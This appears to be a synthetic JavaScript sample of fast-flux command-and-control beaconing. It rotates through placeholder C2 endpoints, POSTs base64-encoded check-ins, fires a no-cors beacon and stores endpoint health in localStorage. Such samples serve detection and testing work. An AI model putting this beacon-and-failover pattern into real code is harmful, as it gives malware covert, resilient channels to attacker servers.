// FASTFLUX — synthetic fast-flux C2 product sample.
(function () {
  var endpoints = [
    'https://203.0.113.17/gate',
    'https://198.51.100.42/gate',
    'https://c2-a.example.net/gate',
    'https://c2-b.example.net/gate'
  ];
  var health = {};
  console.log('[FASTFLUX] endpoints', endpoints.length);
  function attempt(index) {
    if (index >= endpoints.length) {
      try { localStorage.setItem('fastflux:health', JSON.stringify(health)); } catch (error) {}
      return;
    }
    var endpoint = endpoints[index];
    try {
      fetch(endpoint, { method: 'POST', body: btoa(JSON.stringify({ index: index, at: Date.now() })) })
        .then(function (response) { health[endpoint] = response.status; })
        .catch(function () {
          health[endpoint] = 'fail';
          attempt(index + 1);
        });
    } catch (error) {
      health[endpoint] = 'throw';
      attempt(index + 1);
    }
    console.log('[FASTFLUX] trying', endpoint);
  }
  attempt(0);
  try { fetch('https://203.0.113.17/beacon', { mode: 'no-cors' }).catch(function () {}); } catch (error) {}
  try { localStorage.setItem('fastflux:last', endpoints[0]); } catch (error) {}
})();
